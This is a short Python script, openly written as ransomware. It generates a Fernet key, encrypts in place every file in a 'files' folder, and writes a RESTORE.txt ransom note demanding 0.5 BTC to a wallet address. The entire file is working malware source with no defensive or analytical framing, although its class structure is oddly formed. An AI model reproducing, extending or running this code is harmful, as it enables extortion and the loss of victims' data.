#!/usr/bin/env python
#Encoding: utf-8

from cryptography.fernet import Fernet
from glob import glob
import os

class Wallet():
    global wallet
    wallet = b"Your_wallet"

class Restore():
    global restore_text
    restore_text = (b"All your files has been encrypted\n\n\
If you want to restored it send 0.5 BTC to the following wallet:\n\n\
"+wallet)

class Ransomware():

    class __init__():
        def __init__( ):
            file = None
            self = None
            self_ = None

    global generate_key
    global return_key
    global encrypt


    def generate_key( ):
        key = Fernet.generate_key()
        with open("key.key", "wb") as key_file:
             key_file.write(key)

    def return_key( ):
        return open("key.key", "rb").read()

    def encrypt(items, key):
        f = Fernet(key)

        for item in items:
            with open(item, "rb") as file:
                file_data = file.read()

            encrypted_data =  f.encrypt(file_data)

            with open(item, "wb") as file:
                file.write(encrypted_data)
                file.close()


class start():
    if __name__ == "__main__":
        
        pte = glob('files/*')

        generate_key()
        key = return_key()

        encrypt(pte, key)

        with open("RESTORE.txt", "wb") as restore:
            restore.write(restore_text)
            restore.close()